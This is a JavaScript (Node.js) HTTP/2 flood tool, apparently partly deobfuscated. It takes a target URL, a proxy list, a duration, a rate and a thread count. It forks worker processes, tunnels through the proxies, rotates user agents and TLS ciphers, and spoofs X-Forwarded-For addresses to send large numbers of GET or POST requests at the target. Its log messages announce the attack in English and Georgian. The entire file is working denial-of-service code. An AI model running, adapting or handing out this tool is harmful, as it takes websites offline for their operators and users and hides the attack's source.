var _0xd3ce = ["uncaughtException", "on", "unhandledRejection", "defaultMaxListeners", "EventEmitter", "events", "fs", "url", "randomstring", "path", "cluster", "http2", "basename", "length", "argv", "", "log", "node ", ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")', "exit", "\n", "split", "replace", "utf-8", "readFileSync", '""', "cookie=", "includes", "slice", "postdata=", "toUpperCase", "POST", "Method Invalid (Has Postdata But Not POST Method)", "error", "randomstring=", "(!) RandomString Mode", "headerdata=", "max-age=0", "GET", "&", "=", "forEach", "(!) Custom Cookie Mode", "(!) Custom PostData Mode", "(!) Custom HeaderData Mode", "isMaster", "fork", "Started Attacking", "(!) \u10dc\u10d0\u10d9\u10d0\u10d3\u10d8 ", " \u10d2\u10d0\u10e8\u10d5\u10d4\u10d1\u10e3\u10da\u10d8\u10d0", " \u10e8\u10d4\u10e2\u10d4\u10d5\u10d0 \u10d3\u10d0\u10ec\u10e7\u10d4\u10d1\u10e3\u10da\u10d8\u10d0 ", "parse", "setMaxListeners", "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789", "generate", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36", "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0", "Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02", "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)", "Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0", "Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1", "Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36", "12", "012345", ".", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH", "%RAND%", ":method", "Content-Type", "text/plain", "User-agent", "random", "floor", ":", "http", "tls", "DEFAULT_MAX_VERSION", "TLSv1.3", "CONNECT", "host", ":443", "end", "request", "connect", "href", "TLS_method", "h2", ":path", "?", "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789", "X-Forwarded-For", "Body", "Cookie", "response", "close", "(!) Method Invalid"];
process.on('uncaughtException', function(canCreateDiscussions) {});
process.on('unhandledRejection', function(canCreateDiscussions) {});
require('events')['EventEmitter']['defaultMaxListeners'] = 0;
var fs = require('fs');
var url = require('url');
var randstr = require('randomstring');
var path = require('path');
var cluster = require('cluster');
var http2 = require('http2');
var fileName = __filename;
var file = path.basename(fileName);
var headerbuilders = void 0;
var COOKIES = undefined;
var POSTDATA = undefined;
if (process.argv.length < 8) {
    console.log('');
    console.log('node ' + file + ' <MODE> <host> <proxies> <duration> <rate> <threads> (options cookie="" postdata="" randomstring="" headerdata="")');
    process.exit(0);
}
var randomparam = false;
var proxies = fs.readFileSync(process.argv[4], 'utf-8').toString()['replace'](/\r/g, '')['split']('');
var rate = process.argv[6];
var target_url = process.argv[3];
var target = target_url.split('""')[0];
process.argv.forEach(function(mmCoreSplitViewBlock) {
    if (mmCoreSplitViewBlock.includes('cookie=') && !process.argv[2]['split']('""')[0]['includes'](mmCoreSplitViewBlock)) {
        COOKIES = mmCoreSplitViewBlock.slice(7);
    } else {
        if (mmCoreSplitViewBlock.includes('postdata=') && !process.argv[2]['split']('""')[0]['includes'](mmCoreSplitViewBlock)) {
            if (process.argv[2]['toUpperCase']() != 'POST') {
                console.error('Method Invalid (Has Postdata But Not POST Method)');
                process.exit(1);
            }
            POSTDATA = mmCoreSplitViewBlock.slice(9);
        } else {
            if (mmCoreSplitViewBlock.includes('randomstring=')) {
                randomparam = mmCoreSplitViewBlock.slice(13);
                console.log('(!) RandomString Mode');
            } else {
                if (mmCoreSplitViewBlock.includes('headerdata=')) {
                    headerbuilders = {
                        "Cache-Control": 'max-age=0',
                        "Referer": target,
                        "X-Forwarded-For": spoof(),
                        "Cookie": COOKIES,
                        ":method": 'GET'
                    };
                    if (mmCoreSplitViewBlock.slice(11)['split']('""')[0]['includes']('&')) {
                        var fftBinsOfFreq = mmCoreSplitViewBlock.slice(11)['split']('""')[0]['split']('&');
                        var i = 0;
                        for (; i < fftBinsOfFreq.length; i++) {
                            var signedTransactionsCounter = fftBinsOfFreq[i]['split']('=')[0];
                            var signedTxHex = fftBinsOfFreq[i]['split']('=')[1];
                            headerbuilders[signedTransactionsCounter] = signedTxHex;
                        }
                    } else {
                        var _0x6ebcx = mmCoreSplitViewBlock.slice(11)['split']('""')[0];
                        var signedTransactionsCounter = _0x6ebcx.split('=')[0];
                        var signedTxHex = _0x6ebcx.split('=')[1];
                        headerbuilders[signedTransactionsCounter] = signedTxHex;
                    }
                }
            }
        }
    }
});
if (COOKIES !== undefined) {
    console.log('(!) Custom Cookie Mode');
} else {
    COOKIES = '';
}
if (POSTDATA !== undefined) {
    console.log('(!) Custom PostData Mode');
} else {
    POSTDATA = '';
}
if (headerbuilders !== undefined) {
    console.log('(!) Custom HeaderData Mode');
    if (cluster.isMaster) {
        var i = 0;
        for (; i < process.argv[7]; i++) {
            cluster.fork();
            console.log("" + 'Started Attacking');
        }
        console.log('');
        setTimeout(function() {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
} else {
    headerbuilders = {
        "Cache-Control": 'max-age=0',
        "Referer": target,
        "X-Forwarded-For": spoof(),
        "Cookie": COOKIES,
        ":method": 'GET'
    };
    if (cluster.isMaster) {
        var _i = 0;
        for (; _i < process.argv[7]; _i++) {
            cluster.fork();
            console.log("" + '(!) ნაკადი ' + _i + ' გაშვებულია');
        }
        console.log(' შეტევა დაწყებულია ');
        setTimeout(function() {
            process.exit(1);
        }, process.argv[5] * 1000);
    } else {
        startflood();
    }
}
var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
    var _0x6ebcx19 = randstr.generate({
        "charset": '0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789',
        "length": 4
    });
    return _0x6ebcx19;
}
var UAs = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:99.0) Gecko/20100101 Firefox/99.0', 'Opera/9.80 (Android; Opera Mini/7.5.54678/28.2555; U; ru) Presto/2.10.289 Version/12.02', 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 10.0; Trident/6.0; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Android 11; Mobile; rv:99.0) Gecko/99.0 Firefox/99.0', 'Mozilla/5.0 (iPad; CPU OS 15_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/99.0.4844.59 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Linux; Android 10; JSN-L21) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.58 Mobile Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36'];

function spoof() {
    return "" + '' + randstr.generate({
        length: 1,
        charset: '12'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '.' + randstr.generate({
        length: 1,
        charset: '12'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '.' + randstr.generate({
        length: 1,
        charset: '12'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '.' + randstr.generate({
        length: 1,
        charset: '12'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '' + randstr.generate({
        length: 1,
        charset: '012345'
    }) + '';
}
var cplist = ['RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM', 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH'];

function startflood() {
    if (process.argv[2]['toUpperCase']() == 'POST') {
        var rootPathSuffix = url.parse(target)['path']['replace']('%RAND%', ra());
        headerbuilders[':method'] = 'POST';
        headerbuilders['Content-Type'] = 'text/plain';
        if (randomparam) {
            setInterval(function() {
                headerbuilders['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
                var e3 = cplist[Math.floor(Math.random() * cplist.length)];
                var url = proxies[Math.floor(Math.random() * proxies.length)];
                url = url.split(':');
                var CheckDailyStat = require('http');
                var TagHourlyStat = require('tls');
                TagHourlyStat.DEFAULT_MAX_VERSION = 'TLSv1.3';
                var _0x6ebcx23 = CheckDailyStat.request({
                    host: url[0],
                    port: url[1],
                    ciphers: e3,
                    method: 'CONNECT',
                    path: parsed.host + ':443'
                }, function(canCreateDiscussions) {
                    _0x6ebcx23.end();
                    return;
                });
                _0x6ebcx23.on('connect', function(canCreateDiscussions, p, isSlidingUp) {
                    var _0x6ebcx27 = http2.connect(parsed.href, {
                        createConnection: function test() {
                            return TagHourlyStat.connect({
                                host: parsed.host,
                                ciphers: e3,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: p
                            }, function() {
                                var create = function logout(sid) {
                                    headerbuilders[':path'] = "" + '' + url.parse(target)['path']['replace']('%RAND%', ra()) + '?' + randomparam + '=' + randstr.generate({
                                        length: 12,
                                        charset: 'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789'
                                    }) + '';
                                    headerbuilders['X-Forwarded-For'] = spoof();
                                    headerbuilders.Body = "" + '' + (POSTDATA.includes('%RAND%') ? POSTDATA.replace('%RAND%', ra()) : POSTDATA) + '';
                                    headerbuilders.Cookie.replace('%RAND%', ra());
                                    var _0x6ebcx23 = _0x6ebcx27.request(headerbuilders);
                                    _0x6ebcx23.end();
                                    _0x6ebcx23.on('response', function() {
                                        _0x6ebcx23.close();
                                    });
                                };
                                var total = 0;
                                for (; total < rate; total++) {
                                    create(total);
                                }
                            });
                        }
                    });
                });
                _0x6ebcx23.end();
            });
        } else {
            setInterval(function() {
                headerbuilders['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
                var e3 = cplist[Math.floor(Math.random() * cplist.length)];
                var url = proxies[Math.floor(Math.random() * proxies.length)];
                url = url.split(':');
                var CheckDailyStat = require('http');
                var TagHourlyStat = require('tls');
                TagHourlyStat.DEFAULT_MAX_VERSION = 'TLSv1.3';
                var _0x6ebcx23 = CheckDailyStat.request({
                    host: url[0],
                    port: url[1],
                    ciphers: e3,
                    method: 'CONNECT',
                    path: parsed.host + ':443'
                }, function(canCreateDiscussions) {
                    _0x6ebcx23.end();
                    return;
                });
                _0x6ebcx23.on('connect', function(canCreateDiscussions, p, isSlidingUp) {
                    var _0x6ebcx27 = http2.connect(parsed.href, {
                        createConnection: function show() {
                            return TagHourlyStat.connect({
                                host: "" + '' + (url.parse(target)['path']['includes']('%RAND%') ? rootPathSuffix : url.parse(target)['path']) + '',
                                ciphers: e3,
                                secureProtocol: 'TLS_method',
                                servername: parsed.host,
                                secure: true,
                                rejectUnauthorized: false,
                                ALPNProtocols: ['h2'],
                                socket: p
                            }, function() {
                                var _loop2 = function iter(i) {
                                    headerbuilders[':path'] = "" + '' + url.parse(target)['path']['replace']('%RAND%', ra()) + '';
                                    headerbuilders['X-Forwarded-For'] = spoof();
                                    headerbuilders.Body = "" + '' + (POSTDATA.includes('%RAND%') ? POSTDATA.replace('%RAND%', ra()) : POSTDATA) + '';
                                    headerbuilders.Cookie.replace('%RAND%', ra());
                                    var _0x6ebcx23 = _0x6ebcx27.request(headerbuilders);
                                    _0x6ebcx23.end();
                                    _0x6ebcx23.on('response', function() {
                                        _0x6ebcx23.close();
                                    });
                                };
                                var i = 0;
                                for (; i < rate; i++) {
                                    _loop2(i);
                                }
                            });
                        }
                    });
                });
                _0x6ebcx23.end();
            });
        }
    } else {
        if (process.argv[2]['toUpperCase']() == 'GET') {
            headerbuilders[':method'] = 'GET';
            if (randomparam) {
                setInterval(function() {
                    headerbuilders['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
                    var e3 = cplist[Math.floor(Math.random() * cplist.length)];
                    var url = proxies[Math.floor(Math.random() * proxies.length)];
                    url = url.split(':');
                    var CheckDailyStat = require('http');
                    var TagHourlyStat = require('tls');
                    TagHourlyStat.DEFAULT_MAX_VERSION = 'TLSv1.3';
                    var _0x6ebcx23 = CheckDailyStat.request({
                        host: url[0],
                        port: url[1],
                        ciphers: e3,
                        method: 'CONNECT',
                        path: parsed.host + ':443'
                    }, function(canCreateDiscussions) {
                        _0x6ebcx23.end();
                        return;
                    });
                    _0x6ebcx23.on('connect', function(canCreateDiscussions, p, isSlidingUp) {
                        var _0x6ebcx27 = http2.connect(parsed.href, {
                            createConnection: function test() {
                                return TagHourlyStat.connect({
                                    host: parsed.host,
                                    ciphers: e3,
                                    secureProtocol: 'TLS_method',
                                    servername: parsed.host,
                                    secure: true,
                                    rejectUnauthorized: false,
                                    ALPNProtocols: ['h2'],
                                    socket: p
                                }, function() {
                                    var create = function logout(sid) {
                                        headerbuilders[':path'] = "" + '' + url.parse(target)['path']['replace']('%RAND%', ra()) + '?' + randomparam + '=' + randstr.generate({
                                            length: 12,
                                            charset: 'ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789'
                                        }) + '';
                                        headerbuilders['X-Forwarded-For'] = spoof();
                                        headerbuilders.Cookie.replace('%RAND%', ra());
                                        var _0x6ebcx23 = _0x6ebcx27.request(headerbuilders);
                                        _0x6ebcx23.end();
                                        _0x6ebcx23.on('response', function() {
                                            _0x6ebcx23.close();
                                        });
                                    };
                                    var total = 0;
                                    for (; total < rate; total++) {
                                        create(total);
                                    }
                                });
                            }
                        });
                    });
                    _0x6ebcx23.end();
                });
            } else {
                setInterval(function() {
                    headerbuilders['User-agent'] = UAs[Math.floor(Math.random() * UAs.length)];
                    var e3 = cplist[Math.floor(Math.random() * cplist.length)];
                    var url = proxies[Math.floor(Math.random() * proxies.length)];
                    url = url.split(':');
                    var CheckDailyStat = require('http');
                    var TagHourlyStat = require('tls');
                    TagHourlyStat.DEFAULT_MAX_VERSION = 'TLSv1.3';
                    var _0x6ebcx23 = CheckDailyStat.request({
                        host: url[0],
                        port: url[1],
                        ciphers: e3,
                        method: 'CONNECT',
                        path: parsed.host + ':443'
                    }, function(canCreateDiscussions) {
                        _0x6ebcx23.end();
                        return;
                    });
                    _0x6ebcx23.on('connect', function(canCreateDiscussions, p, isSlidingUp) {
                        var _0x6ebcx27 = http2.connect(parsed.href, {
                            createConnection: function test() {
                                return TagHourlyStat.connect({
                                    host: parsed.host,
                                    ciphers: e3,
                                    secureProtocol: 'TLS_method',
                                    servername: parsed.host,
                                    secure: true,
                                    rejectUnauthorized: false,
                                    ALPNProtocols: ['h2'],
                                    socket: p
                                }, function() {
                                    var create = function logout(sid) {
                                        headerbuilders[':path'] = "" + '' + url.parse(target)['path']['replace']('%RAND%', ra()) + '';
                                        headerbuilders['X-Forwarded-For'] = spoof();
                                        headerbuilders.Cookie.replace('%RAND%', ra());
                                        var _0x6ebcx23 = _0x6ebcx27.request(headerbuilders);
                                        _0x6ebcx23.end();
                                        _0x6ebcx23.on('response', function() {
                                            _0x6ebcx23.close();
                                        });
                                    };
                                    var total = 0;
                                    for (; total < rate; total++) {
                                        create(total);
                                    }
                                });
                            }
                        });
                    });
                    _0x6ebcx23.end();
                });
            }
        } else {
            console.log('(!) Method Invalid');
            process.exit(1);
        }
    }
};